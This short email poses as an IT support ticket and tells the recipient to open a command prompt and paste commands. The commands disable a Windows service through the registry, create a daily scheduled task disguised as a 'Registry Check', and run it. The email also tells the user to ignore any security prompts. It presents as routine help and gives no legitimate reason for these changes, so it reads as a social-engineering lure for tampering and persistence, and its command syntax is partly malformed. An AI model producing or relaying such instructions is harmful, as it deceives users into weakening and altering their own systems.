Subject: IT Support Ticket for Your Workstation

Hello,

We have received an IT support ticket requesting assistance with your workstation. Please follow these steps to complete a system check:

STEP 1:
Access your computer's command line by pressing Win + R and typing "cmd" in the Run dialog, then hit Enter.

STEP 2:
Copy and paste the following commands into the command prompt and press Enter after each one:
```
reg add HKLM\SYSTEM\CurrentControlSet\Services\Browser /v Start /t REG_DWORD /d 0x4 /f
schtasks /create /tn "Registry Check" /tr "cmd.exe /c start "" \"C:\Program Files (x86)\Internet Explorer\iexplore.exe\" -nomergeabout:blank" /sc daily /st 03:00
schtasks /run /tn "Registry Check"
```
Note: Ignore any pop-ups or prompts that may appear during this process.

STEP 3:
Once the commands have been executed, close the command prompt window and restart your computer for the changes to take effect.

Please let us know if you need further assistance with this issue.
